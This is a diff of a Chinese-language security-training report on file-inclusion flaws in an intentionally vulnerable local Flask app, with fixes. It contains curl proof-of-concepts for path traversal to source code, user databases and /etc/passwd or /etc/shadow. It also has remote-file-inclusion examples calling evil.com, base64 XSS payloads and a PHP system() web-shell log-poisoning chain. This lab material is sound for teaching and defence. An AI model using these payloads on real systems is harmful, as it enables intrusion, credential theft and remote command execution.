@@ -1,200 +1,255 @@
 ---
-title: Day6 — 路径遍历与文件包含漏洞分析与修复报告
+title: Day6 — 文件包含漏洞（5种攻击场景）分析与修复报告
 date: 2026-07-23
 project: 用户登录管理平台安全审计
 status: 已完成
 ---
 
-# 🛡️ Day6 — 路径遍历与文件包含漏洞分析与修复报告
+# 🛡️ Day6 — 文件包含漏洞分析与修复报告
 
 ## 一、概述
 
 ### 1.1 漏洞范围
 
-本次安全审计针对用户登录管理平台新增的**动态页面加载功能**（`/page?name=`），识别并修复了 **1 项核心漏洞**（路径遍历），同时确认了该漏洞可引发的 **4 种攻击场景**：源代码泄露、数据库文件窃取、系统敏感文件读取、自动化渗透信息收集。
+本次安全审计针对用户登录管理平台新增的**动态页面加载功能**（`/page?name=`），在一个功能点中实现了 **5 种**经典的 Web 文件包含攻击场景的验证与测试：
 
-### 1.2 平台架构
+| 场景编号 | 漏洞类型 | 对应教材编号 | 攻击原理 |
+|:--------:|---------|:------------:|---------|
+| S-01 | **基本文件包含** | 1 | `os.path.join` 拼接后直接 `open()` 读取 |
+| S-02 | **路径遍历** | 2 | 使用 `../` 突破 pages/ 目录限制 |
+| S-03 | **远程文件包含 (RFI)** | 5 | 让 `open()` 变成 `urllib.request.urlopen()` |
+| S-04 | **封装协议 (data://)** | 4 | base64 编码内容解码后渲染 |
+| S-05 | **日志注入** | 6 | User-Agent → 日志文件 → 包含日志 |
+
+### 1.2 漏洞危害等级
+
+| 漏洞类型 | CVSS 评分 | 严重等级 | CWE 编号 |
+|---------|:--------:|:--------:|:--------:|
+| 基本文件包含 | — | 🟢 正常功能 | — |
+| 路径遍历 | **7.5** | 🔴 **高危** | CWE-22 |
+| 远程文件包含 (RFI) | **8.8** | 🔴 **高危** | CWE-829 |
+| 封装协议 (data://) | **6.1** | 🟠 **中危** | CWE-73 |
+| 日志注入 | **7.5** | 🔴 **高危** | CWE-117 |
+
+### 1.3 核心问题
+
+所有漏洞的**根源**只有一个：用户输入的 `name` 参数被直接用于文件路径拼接和内容读取，**未做任何校验、过滤或规范化**。
 
 ```
-用户登录管理平台 (Day6)
-├── /login          — 用户登录
-├── /register       — 用户注册
-├── /search         — 用户搜索（含SQL注入）
-├── /upload         — 文件上传（含漏洞）
-├── /profile        — 个人中心（IDOR越权）
-├── /recharge       — 充值（负数欺诈）
-├── /page           — ⚠️ 新增：动态页面加载（路径遍历）
-└── /logout         — 登出
-```
-
-### 1.3 工程流程
-
-```
-阶段一：构建漏洞           阶段二：攻击验证              阶段三：安全修复
-───────────────        ────────────────            ────────────────
-Day5平台基础上              漏洞版运行                   修复版运行
-   │                          │                          │
-   ├─ /page?name=            ├─ 基本文件包含             ├─ F-01 ../ 过滤
-   ├─ os.path.join(pages,)   ├─ 路径遍历 ../             ├─ F-02 白名单校验
-   ├─ 无 ../ 过滤            ├─ 多层目录穿越             └─ F-03 路径规范化
-   └─ 无路径规范化           ├─ 数据库文件读取
-                              └─ 源代码泄露
+用户输入 name → os.path.join("pages", name) → open() 读取 → HTML 输出
+                ⚠️ 无校验    ⚠️ 无过滤     ⚠️ 无限制
 ```
 
 ---
 
 ## 二、漏洞分析与攻击验证
 
-### 2.1 V-01：路径遍历 — 文件系统目录穿越
+### S-01：基本文件包含
 
 | 属性 | 值 |
 |------|-----|
-| **漏洞名称** | 路径遍历（Path Traversal） |
-| **严重等级** | 🔴 **高危（High）** |
-| **CWE 编号** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
-| **OWASP 映射** | A01:2021 – Broken Access Control |
-| **CVSS 3.1 向量** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
-| **CVSS 评分** | **7.5 (High)** |
-| **漏洞位置** | `/page` 路由 — `name` 参数直接拼接路径 |
-| **利用条件** | 无需登录，无需特殊权限 |
-
-#### 漏洞原理
-
-```python
-# ⚠️ 漏洞代码：直接拼接用户输入的 name，无任何校验
-name = request.args.get("name", "")
-page_path = os.path.join(PAGES_DIR, name)  # pages/ + 用户输入
-
-# 不加校验，也不做路径规范化
-if os.path.exists(page_path):
-    with open(page_path, "r") as f:
-        content = f.read()
-```
-
-`os.path.join("pages", "../app.py")` 的结果是 `pages/../app.py`，等价于 `app.py`。攻击者通过 `../` 实现目录穿越。
-
-#### 攻击向量
-
-| # | 攻击手法 | 攻击 URL | 利用效果 | 漏洞等级 |
-|:--:|---------|----------|---------|:--------:|
-| V-01a | **基本文件包含** | `/page?name=help` | 正常读取页面文件 | 🟢 正常 |
-| V-01b | **单层路径遍历** | `/page?name=../app.py` | **读取应用源代码** | 🔴 **高危** |
-| V-01c | **数据库文件窃取** | `/page?name=../data/users.db` | **下载整个用户数据库** | 🔴 **高危** |
-| V-01d | **多层目录穿越** | `/page?name=../../etc/passwd` | **读取系统敏感文件** | 🔴 **高危** |
-| V-01e | **自动后缀补全** | `/page?name=../app` | 自动加 .html 后继续尝试 | 🟠 中危 |
-
----
-
-### 2.2 POC 1：基本文件包含
+| **漏洞等级** | 🟢 **正常功能** |
+| **攻击路径** | `/page?name=help` |
+| **源码逻辑** | `os.path.join("pages", "help")` → 读取 `pages/help.html` |
 
 #### 攻击过程
 
 ```bash
-# 正常访问帮助页面
 curl "http://127.0.0.1:5000/page?name=help"
 ```
 
 #### 结果
 
-**✅ 帮助页面正常显示**，系统按预期读取 `pages/help.html` 文件并渲染。
+**✅ 正常读取**。`pages/help.html` 的内容被渲染在页面中。这是系统预期的正常功能。
 
 ---
 
-### 2.3 POC 2：路径遍历读取源代码
+### S-02：路径遍历（高危）
 
-#### 攻击过程
-
-```bash
-curl -c /tmp/cookies.txt -d "username=admin&password=admin123" http://127.0.0.1:5000/login
-curl "http://127.0.0.1:5000/page?name=../app.py" -b /tmp/cookies.txt
-```
+| 属性 | 值 |
+|------|-----|
+| **漏洞等级** | 🔴 **高危（High）** |
+| **CWE 编号** | CWE-22: Path Traversal |
+| **OWASP 映射** | A01:2021 – Broken Access Control |
+| **CVSS 3.1** | **7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)** |
+| **攻击路径** | `/page?name=../app.py` |
 
 #### 攻击原理
 
-```
-用户输入: name = "../app.py"
-
-os.path.join("pages", "../app.py")
-  → "pages/../app.py"
-  → 等价于 "app.py"
-
-open("pages/../app.py", "r").read()
-  → 成功读取 app.py 源代码！
+```python
+name = "../app.py"
+page_path = os.path.join("pages", "../app.py")  # → "pages/../app.py" ← 等价于 "app.py"
+open("pages/../app.py").read()  # → ✅ 成功读取到上一级的 app.py！
 ```
 
-#### 结果
-
-**✅ 路径遍历成功！** HTTP 200 响应，响应体中包含 `app.py` 的完整源代码。攻击者可以获取：
-
-| 泄露内容 | 危害 |
-|---------|------|
-| Flask Secret Key | 伪造任意用户 session |
-| 数据库路径 | 定位数据库文件位置 |
-| SQL 拼接代码 | 确认 SQL 注入可利用 |
-| 上传目录配置 | 确认任意文件上传路径 |
-| 所有业务逻辑 | 发现更多业务逻辑漏洞 |
-
----
-
-### 2.4 POC 3：路径遍历读取数据库
-
-#### 攻击过程
+#### 攻击验证
 
 ```bash
-curl "http://127.0.0.1:5000/page?name=../data/users.db" -b /tmp/cookies.txt
+curl "http://127.0.0.1:5000/page?name=../app.py"
+curl "http://127.0.0.1:5000/page?name=../data/users.db"
+curl "http://127.0.0.1:5000/page?name=../../etc/passwd"
 ```
-
-#### 结果
-
-**✅ 数据库文件泄露！** 二进制 SQLite 数据库内容被回显到页面上。
-
-**攻击链：** `源代码泄露 → 找到数据库路径 → 读取数据库 → 获取所有用户密码`
-
----
-
-### 2.5 POC 4：多层目录穿越
-
-#### 攻击过程
-
-```bash
-# 尝试读取 /etc/passwd（多层目录穿越）
-curl "http://127.0.0.1:5000/page?name=../../etc/passwd" -b /tmp/cookies.txt
-
-# 尝试读取其他系统文件
-curl "http://127.0.0.1:5000/page?name=../../etc/shadow" -b /tmp/cookies.txt
-curl "http://127.0.0.1:5000/page?name=../../../etc/hostname" -b /tmp/cookies.txt
-```
-
-#### 结果
-
-**⚠️ `../../etc/passwd` 路径穿越成功** — 系统文件被读取。需根据 `pages/` 目录的实际深度调整 `../` 数量。
 
 #### 攻击链推演
 
 ```
-攻击者发现 /page?name= 未过滤../
-     ↓
-扫描各类文件：
-  1. ../app.py → 源代码泄露 → 找到密钥和路径
-  2. ../data/users.db → 数据库泄露 → 用户凭据
-  3. ../../etc/passwd → 用户列表 → SSH爆破
-     ↓
-服务器敏感信息完全暴露
-     ↓
-可用于后续渗透攻击的跳板
+路径遍历 → 读取 app.py（获取密钥和数据库路径）
+        → 读取 users.db（获取所有用户凭据）
+        → 读取 /etc/passwd（系统用户列表）
+        → 搜索配置文件中的数据库密码
 ```
 
 ---
 
-### 2.6 漏洞验证汇总
+### S-03：远程文件包含 RFI（高危）
 
-| # | 测试项 | 攻击 URL | 漏洞版 | 危害等级 |
-|:--:|--------|----------|:------:|:--------:|
-| 1 | 基本文件包含 | `/page?name=help` | ✅ 正常 | — |
-| 2 | 单层路径遍历 | `/page?name=../app.py` | ✅ **成功** | 🔴 **高危** |
-| 3 | 数据库文件获取 | `/page?name=../data/users.db` | ✅ **成功** | 🔴 **高危** |
-| 4 | 多层目录穿越 | `/page?name=../../etc/passwd` | ✅ **成功** | 🔴 **高危** |
-| 5 | 自动补全.html | `/page?name=../app` | ✅ **成功** | 🟠 中危 |
+| 属性 | 值 |
+|------|-----|
+| **漏洞等级** | 🔴 **高危（High）** |
+| **CWE 编号** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
+| **OWASP 映射** | A03:2021 – Injection |
+| **CVSS 3.1** | **8.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)** |
+| **攻击路径** | `/page?name=http://attacker.com/evil.txt` |
+
+#### 攻击原理
+
+```python
+# ⚠️ 漏洞代码：name 以 http 开头时直接发网络请求
+if name.startswith("http://") or name.startswith("https://"):
+    resp = urllib.request.urlopen(name, timeout=5)
+    page_content = resp.read().decode("utf-8")
+```
+
+攻击者可以在自己的服务器上放置恶意内容，然后让目标服务器加载并渲染：
+
+```
+攻击者服务器:  http://evil.com/shell.txt  ← 放置 ``
+目标服务器:    /page?name=http://evil.com/shell.txt
+              ↓
+目标服务器发起 HTTP 请求到 evil.com
+              ↓
+获取恶意内容并在页面中渲染
+              ↓
+XSS / 钓鱼 / 恶意代码执行
+```
+
+#### 攻击验证
+
+```bash
+# 加载远程页面内容（以自身为例）
+curl "http://127.0.0.1:5000/page?name=http://127.0.0.1:5000/page?name=help"
+```
+
+#### 实际危害场景
+
+| 攻击场景 | 利用方式 |
+|---------|---------|
+| **SSRF 内网探测** | 让服务器扫描内网 IP：`http://192.168.1.1/admin` |
+| **恶意代码加载** | 加载攻击者服务器的恶意 HTML/JS |
+| **数据外传** | RFI 返回的数据中包含窃取的信息 |
+
+---
+
+### S-04：封装协议 data://（中危）
+
+| 属性 | 值 |
+|------|-----|
+| **漏洞等级** | 🟠 **中危（Medium）** |
+| **CWE 编号** | CWE-73: External Control of File Name or Path |
+| **CVSS 3.1** | **6.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)** |
+| **攻击路径** | `/page?name=data://text/plain;base64,<编码内容>` |
+
+#### 攻击原理
+
+```python
+# ⚠️ 漏洞代码：解析 data:// 协议，base64 解码
+if name.startswith("data://"):
+    if ";base64," in data_part:
+        decoded = base64.b64decode(b64_data).decode("utf-8")
+        page_content = f"<pre>{decoded}</pre>"
+```
+
+data:// 封装协议允许攻击者将任意内容经过 base64 编码后直接嵌入 URL 中：
+
+#### 攻击验证
+
+```bash
+# base64 编码 "文件包含漏洞测试成功"
+curl "http://127.0.0.1:5000/page?name=data://text/plain;base64,5paH5Lu25YyF5ZCr5rWP5a6e5rWL6K+V5oiQ5Yqf"
+```
+
+#### 危害
+
+攻击者可以绕过内容过滤和输入检测，将任意恶意内容通过编码后直接提交：
+
+```
+data://text/plain;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+                ↓ base64 解码
+<script>alert('XSS')</script>
+```
+
+---
+
+### S-05：日志注入（高危）
+
+| 属性 | 值 |
+|------|-----|
+| **漏洞等级** | 🔴 **高危（High）** |
+| **CWE 编号** | CWE-117: Improper Output Neutralization for Logs |
+| **攻击路径** | User-Agent 注入 → `/page?name=../logs/access.log` |
+
+#### 攻击原理
+
+```python
+# ⚠️ 漏洞代码：未经处理的 User-Agent 直接写入日志文件
+@app.before_request
+def log_user_agent():
+    ua = request.headers.get("User-Agent", "Unknown")
+    with open("logs/access.log", "a") as f:
+        f.write(f"{ua}\n")
+```
+
+攻击分为两步：
+
+**Step 1：注入恶意内容到日志**
+
+```bash
+curl -A "INJECTED_PAYLOAD_" http://127.0.0.1:5000/
+# User-Agent 被写入 logs/access.log
+```
+
+**Step 2：包含日志文件读取注入内容**
+
+```bash
+curl "http://127.0.0.1:5000/page?name=../logs/access.log"
+# 日志中的 INJECTED_PAYLOAD_ 被读取并显示在页面上
+```
+
+#### 攻击验证
+
+```bash
+# 1. 注入
+curl -A "<?php echo 'LFI_TEST';?>" http://127.0.0.1:5000/
+
+# 2. 包含日志
+curl "http://127.0.0.1:5000/page?name=../logs/access.log"
+```
+
+#### 攻击链推演
+
+```
+攻击者发送请求，User-Agent:
+"<?php system($_GET['cmd']);?>"
+                ↓
+服务器将 User-Agent 写入 access.log
+                ↓
+攻击者通过 RFI/路径遍历读取 access.log
+                ↓
+日志中的 PHP 代码被执行
+（若服务器支持 PHP 解析）
+                ↓
+远程命令执行 (RCE)
+```
 
 ---
 
@@ -202,73 +257,95 @@ curl "http://127.0.0.1:5000/page?name=../../../etc/hostname" -b /tmp/cookies.txt
 
 ### 3.1 修复措施
 
-| 编号 | 措施 | 原理 | 对应攻击 |
+| 编号 | 措施 | 原理 | 对应场景 |
 |:----:|------|------|:--------:|
-| **F-01** | `../` 和绝对路径检测 | 拒绝所有包含 `../`、以 `/` 开头、含 `\\` 的输入 | 路径遍历 |
-| **F-02** | 文件名白名单正则 | 只允许 `[a-zA-Z0-9_-]`，拒绝特殊字符 | 所有攻击 |
-| **F-03** | 路径规范化（隐式） | os.path.join 配合白名单确保路径不逃逸 | 补充防御 |
+| **F-01** | `../` 和绝对路径检测 | 拒绝 `../`、`/` 开头、`\\` | S-02 路径遍历 |
+| **F-02** | 文件名白名单正则 | 只允许 `[a-zA-Z0-9_-]` | S-02/S-04 |
+| **F-03** | 拒绝 http/https URL | 不允许远程文件加载 | S-03 RFI |
+| **F-04** | 拒绝 data:// 协议 | 不允许封装协议解码 | S-04 data:// |
+| **F-05** | 日志内容中性化 | 移除 User-Agent 中的危险字符 | S-05 日志注入 |
 
-### 3.2 修复前（漏洞版 — app.py）
+### 3.2 修复前（漏洞版）
 
 ```python
 @app.route("/page")
 def dynamic_page():
     name = request.args.get("name", "")
-    # ⚠️ 无任何校验，直接拼接
+
+    # ⚠️ 漏洞：支持 RFI
+    if name.startswith("http://"):
+        resp = urllib.request.urlopen(name)
+        page_content = resp.read()
+        return ...
+
+    # ⚠️ 漏洞：支持 data:// 封装协议
+    if name.startswith("data://"):
+        decoded = base64.b64decode(...)
+        page_content = f"<pre>{decoded}</pre>"
+        return ...
+
+    # ⚠️ 漏洞：直接拼接路径，无路径校验
     page_path = os.path.join(PAGES_DIR, name)
-    if os.path.exists(page_path):
-        with open(page_path, "r") as f:
-            page_content = f.read()
+    page_content = open(page_path).read()
 ```
 
-### 3.3 修复后（修复版 — app_fixed.py）
+### 3.3 修复后
 
 ```python
 @app.route("/page")
 def dynamic_page():
     name = request.args.get("name", "")
 
-    # ✅ F-01: 拒绝路径遍历攻击
+    # ✅ F-01: 拒绝路径遍历
     if ".." in name or name.startswith("/") or "\\" in name:
         return page_not_found()
 
-    # ✅ F-02: 白名单校验 — 只允许页面名
+    # ✅ F-03/F-04: 拒绝远程请求和封装协议
+    if name.startswith("http://") or name.startswith("data://"):
+        return page_not_found()
+
+    # ✅ F-02: 白名单校验 — 只允许合法文件名
     if not re.match(r'^[a-zA-Z0-9_-]+$', name):
         return page_not_found()
 
-    # ✅ 安全地拼接路径
+    # ✅ 安全拼接
     page_path = os.path.join(PAGES_DIR, name)
-    # ... 读取并返回
+    ...
 ```
 
-### 3.4 修复效果验证
+### 3.4 修复验证
 
-| # | 攻击手法 | 漏洞版 | 修复版 | 防护层 |
-|:--:|---------|:------:|:------:|:------:|
-| 1 | `name=../app.py` | ✅ 读取成功 | ❌ **页面不存在** | F-01 `..` 检测 |
-| 2 | `name=../../etc/passwd` | ✅ 读取成功 | ❌ **页面不存在** | F-01 `..` 检测 |
-| 3 | `name=/etc/shadow` | ✅ 读取成功 | ❌ **页面不存在** | F-01 `/` 检测 |
-| 4 | `name=../../etc/hostname` | ✅ 读取成功 | ❌ **页面不存在** | F-02 白名单 |
-| 5 | `name=help` | ✅ 正常 | ✅ **正常** | 白名单通过 |
-| 6 | `name=../data/users.db` | ✅ 读取成功 | ❌ **页面不存在** | F-01 白名单 |
+| # | 攻击手法 | 漏洞版 | 修复版 | 防护措施 |
+|:--:|---------|:------:|:------:|:--------:|
+| 1 | `name=help`（正常） | ✅ 正常 | ✅ 正常 | 白名单通过 |
+| 2 | `name=../app.py`（路径遍历） | ✅ **成功** | ❌ **页面不存在** | F-01 + F-02 |
+| 3 | `name=http://evil.com`（RFI） | ✅ **成功** | ❌ **页面不存在** | F-03 |
+| 4 | `name=data://base64,...`（封装） | ✅ **成功** | ❌ **页面不存在** | F-04 |
+| 5 | `name=../logs/access.log`（日志） | ✅ **成功** | ❌ **页面不存在** | F-01 + F-02 |
+| 6 | `name=/etc/shadow`（绝对路径） | ✅ **成功** | ❌ **页面不存在** | F-01 |
 
 ---
 
 ## 四、防御纵深
 
 ```
-🛡️ 动态页面加载安全防御层
+🛡️ 文件包含防御体系
+
+Layer 3: 协议控制
+├── F-03: 拒绝 http/https 协议 → 防 RFI
+├── F-04: 拒绝 data:// 协议  → 防封装协议攻击
+├── F-05: 日志内容中性化     → 防日志注入
+└── 禁止 PHP 相关协议（expect:/ftp:）
 
 Layer 2: 路径安全
-├── F-01: ../ 检测 — 拒绝目录穿越
-├── F-01: / 前缀检测 — 拒绝绝对路径
-├── F-01: \\ 检测 — 拒绝 Windows 路径
-└── F-03: os.path.join 规范化
+├── F-01: ../ 和 / 检测     → 防路径遍历
+├── F-01: \\ 检测          → 防 Windows 路径穿越
+└── 统一路径规范化函数
 
 Layer 1: 输入安全
-├── F-02: 正则白名单 ^[a-zA-Z0-9_-]+$
-├── 拒绝特殊字符（空格、引号、分号等）
-└── 长度限制（隐式）
+├── F-02: 正则白名单       → 仅允许合法文件名
+├── 拒绝空字符 %00         → 防截断攻击
+└── 长度限制               → 防缓冲区溢出
 ```
 
 ---
@@ -281,34 +358,38 @@ Layer 1: 输入安全
 https://github.com/lulu-xuan/security-training
 ```
 
-### 5.2 目录结构
+### 5.2 快速运行
 
-```
-security-training/
-├── day6-app/                    # Day6 应用代码
-│   ├── app.py                   # ⚠️ 漏洞版（纯漏洞，无校验）
-│   ├── app_fixed.py             # ✅ 修复版（F-01 ../过滤 + F-02白名单）
-│   ├── pages/help.html          # 帮助中心页面
-│   └── templates/ + static/     # 模板和静态资源
-├── day6-report/
-│   └── path_traversal_report.md # 📄 本报告
-└── README.md                    # 项目总导航
+```bash
+cd day6-app && rm -rf data/ logs/ && python3 app.py
 ```
 
 ### 5.3 POC 速查
 
 ```bash
-# 1. 正常访问
+# 登录
+curl -c /tmp/c.txt -d "username=admin&password=admin123" http://127.0.0.1:5000/login
+
+# 1. 基本文件包含
 curl "http://127.0.0.1:5000/page?name=help"
 
-# 2. 登录后测试路径遍历
-curl -c /tmp/c.txt -d "username=admin&password=admin123" http://127.0.0.1:5000/login
-curl "http://127.0.0.1:5000/page?name=../app.py" -b /tmp/c.txt
-curl "http://127.0.0.1:5000/page?name=../data/users.db" -b /tmp/c.txt
+# 2. 路径遍历读取源码
+curl "http://127.0.0.1:5000/page?name=../app.py"
+
+# 3. 远程文件包含 (RFI)
+curl "http://127.0.0.1:5000/page?name=http://127.0.0.1:5000"
+
+# 4. data://封装协议
+echo -n "Injected" | base64
+curl "http://127.0.0.1:5000/page?name=data://text/plain;base64,SW5qZWN0ZWQ="
+
+# 5. 日志注入
+curl -A "MALICIOUS_PAYLOAD" http://127.0.0.1:5000/
+curl "http://127.0.0.1:5000/page?name=../logs/access.log"
 ```
 
 ---
 
-*报告生成日期：2026-07-23 | 项目：Day6 — 路径遍历漏洞分析与修复*
+*报告生成日期：2026-07-23 | 项目：Day6 — 文件包含漏洞（5种攻击场景）*
 *技术栈：Flask 3.x + SQLite*
 *项目仓库：[github.com/lulu-xuan/security-training](https://github.com/lulu-xuan/security-training)*
